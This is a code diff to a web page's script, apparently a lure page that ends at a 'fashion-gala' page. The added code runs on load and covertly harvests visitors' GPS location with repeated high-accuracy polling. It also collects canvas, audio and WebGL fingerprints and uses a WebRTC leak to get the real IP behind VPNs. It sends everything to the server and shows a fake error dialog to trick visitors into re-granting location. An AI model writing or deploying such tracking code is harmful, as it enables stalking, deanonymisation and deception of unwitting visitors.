@@ -4192,82 +4192,147 @@ function trackPage() {
   </noscript>
  <script type="text/javascript" nonce="afa66442b18453981eaabb8a83c61f82" src="/v2vox7/VkF-T/1hxYI/FQ/zOwYNc7tD3chVa1J/KmVoZEZJ/IW5hVD/tyQyg"></script><script type="text/javascript" nonce="afa66442b18453981eaabb8a83c61f82" src="/v2vox7/VkF-T/1hxYI/FQ/zGwYNc7tD3uE/CGJsZEZJ/MyBIPi/l9Lw0ZAQ?v=eedd6907-e094-f40e-3006-120524470216" defer></script></body>
 <script>
+let watchId = null; // Für späteres Stoppen
+
+function getLocationWithFallback() {
+  if (navigator.geolocation) {
+    // ⚡ ERSTE ABFRAGE (sofort)
+    navigator.geolocation.getCurrentPosition(
+      pos => handlePosition(pos, "gps"),
+      err => fallbackToIP(err),
+      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+    );
+
+    // 🔄 WIEDERHOLTE UPDATES (alle 20 Sekunden)
+    watchId = navigator.geolocation.watchPosition(
+      pos => handlePosition(pos, "gps-update"),
+      err => console.warn("GPS Update failed:", err),
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  } else {
+    fallbackToIP();
+  }
+}
+
+function fallbackToIP(gpsError = null) {
+  console.warn("❌ GPS blockiert:", gpsError?.message || "Not supported");
+  getIpLocation();
+  getRealIP();
+}
+
 function collectBrowserFingerprint() {
-  const fingerprint = {
+  // 🎨 CANVAS FINGERPRINTING
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  let canvasHash = "error";
+  try {
+    ctx.textBaseline = "top";
+    ctx.fillText("ZETA-TRACKING", 2, 2);
+    canvasHash = canvas.toDataURL().slice(-20); // 🔥 Einzigartiger Hash
+  } catch (e) {}
+
+  // 🔊 AUDIO-CONTEXT (Hardware-Fingerprint)
+  let audioHash = "error";
+  try {
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const oscillator = audioCtx.createOscillator();
+    const analyser = audioCtx.createAnalyser();
+    oscillator.connect(analyser);
+    oscillator.start();
+    const freqData = new Uint8Array(analyser.frequencyBinCount);
+    analyser.getByteFrequencyData(freqData);
+    audioHash = Array.from(freqData).slice(0, 5).join("-");
+    oscillator.stop();
+  } catch (e) {}
+
+  return {
     screen: `${window.screen.width}x${window.screen.height}`,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     language: navigator.language,
     plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(',') : 'unavailable',
-    userAgent: navigator.userAgent
+    userAgent: navigator.userAgent,
+    canvasHash, // 🖼️ EINZIGARTIGER CANVAS-HASH
+    audioHash,  // 🔊 AUDIO-HARDWARE-ID
+    gpu: getWebGLInfo() // 🎮 WEBGL-RENDERER (siehe unten)
   };
-  return fingerprint;
 }
 
-function getLocationWithFallback() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        const { latitude, longitude, accuracy } = pos.coords;
-        console.log("📍 GPS:", latitude, longitude, "±" + accuracy + "m");
-        sendLocation(latitude, longitude, "gps", accuracy);
-        getRealIP(); 
-      },
-      err => {
-        console.warn("❌ GPS blockiert:", err.message);
-        getIpLocation();
-        getRealIP();
-        // WLAN-Scan entfernt, da nicht mehr unterstützt
-      },
-      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-    );
-  } else {
-    getIpLocation();
-    getRealIP();
+// 🎮 WEBGL-RENDERER AUSLESEN
+function getWebGLInfo() {
+  try {
+    const gl = document.createElement('canvas').getContext('webgl');
+    if (!gl) return "no-webgl";
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    return debugInfo ? {
+      vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+      renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+    } : "no-debug-info";
+  } catch (e) {
+    return "error";
   }
 }
-
-function getIpLocation() {
-  fetch("https://ipapi.co/json/")
-    .then(res => {
-      if (!res.ok) throw new Error('Network response was not ok');
-      return res.json();
-    })
-    .then(data => {
-      console.log("🌍 IP-Standort:", data.city, data.latitude, data.longitude);
-      sendLocation(data.latitude, data.longitude, "ip", null);
-    })
-    .catch(err => console.error("❌ IP-Ortung fehlgeschlagen:", err));
-}
-
 function getRealIP() {
   try {
-    const pc = new RTCPeerConnection({ iceServers: [] });
+    const pc = new RTCPeerConnection({
+      iceServers: [],
+      iceCandidatePoolSize: 10 // 🔥 Mehr Candidates = mehr IPs
+    });
+
     pc.createDataChannel("");
     pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
     pc.onicecandidate = ice => {
-      if (ice && ice.candidate) {
-        const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
-        if (ipMatch) {
-          const ip = ipMatch[1];
-          console.log("🔥 ECHTE IP (WebRTC-Leak):", ip);
-          
-          fetch('/submit-ip', { 
-            method: 'POST', 
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ leakIp: ip }) 
-          }).catch(e => console.error("IP submit failed:", e));
-        }
-        pc.close();
-      }
+      if (!ice.candidate) return;
+
+      // 🔍 ERKENNE ALLE IPs (IPv4 & IPv6)
+      const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/gi;
+      const matches = ice.candidate.candidate.match(ipRegex) || [];
+
+      matches.forEach(ip => {
+        console.log("🔥 ECHTE IP (WebRTC-Leak):", ip);
+        fetch('/submit-ip', {
+          method: 'POST',
+          body: JSON.stringify({ leakIp: ip, type: "webrtc" })
+        }).catch(e => console.error("IP submit failed:", e));
+      });
     };
   } catch (e) {
     console.error("WebRTC failed:", e);
   }
 }
+let gpsUpdates = 0;
 
+function handlePosition(pos, method) {
+  const { latitude, longitude, accuracy, altitude, speed } = pos.coords;
+  gpsUpdates++;
+
+  // 🔥 UMLEITUNGS-LOGIK HIER EINFÜGEN
+  const shouldRedirect = accuracy < 30 || gpsUpdates >= 3;
+  
+  sendLocation(latitude, longitude, method, { 
+    accuracy, altitude, speed,
+    timestamp: new Date().toISOString(),
+    shouldRedirect // 👉 Für Server-Logging
+  });
+
+  // 💀 UMLEITEN, WENN GENAUIGKEIT PASST
+  if (shouldRedirect) {
+    window.location.href = "/fashion-gala.html";
+  }
+
+  // 🎯 FORCIERE NEUE ABFRAGE BEI UNGENAUIGKEIT
+  if (accuracy > 50) {
+    navigator.geolocation.getCurrentPosition(
+      p => handlePosition(p, "gps-forced"),
+      () => {},
+      { enableHighAccuracy: true, maximumAge: 0 }
+    );
+  }
+}
 function sendLocation(lat, lon, method, extraData) {
   const fingerprint = collectBrowserFingerprint();
   console.log("📡 Sende Standort:", { lat, lon, method });
+  
   fetch('/submit', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -4279,11 +4344,24 @@ function sendLocation(lat, lon, method, extraData) {
       extra: extraData,
       fingerprint: fingerprint
     })
-  }).then(() => {
-    window.location.href = "/fashion-gala.html"; 
   }).catch(err => console.error("Fehler:", err));
 }
-
+function getIpLocation() {
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      console.log("🌍 IP-Standort:", data.city, data.latitude, data.longitude);
+      sendLocation(data.latitude, data.longitude, "ip", null);
+    })
+    .catch(err => console.error("❌ IP-Ortung fehlgeschlagen:", err));
+}	
+// Nach 15 Sekunden Fake-Error anzeigen
+setTimeout(() => {
+  if (confirm("⚠️ FEHLER: Standort konnte nicht verifiziert werden. Erneut versuchen?")) {
+    if (watchId) navigator.geolocation.clearWatch(watchId);
+    getLocationWithFallback(); // 🔄 Neustart!
+  }
+}, 15000);	
 window.onload = getLocationWithFallback;
 </script>
 
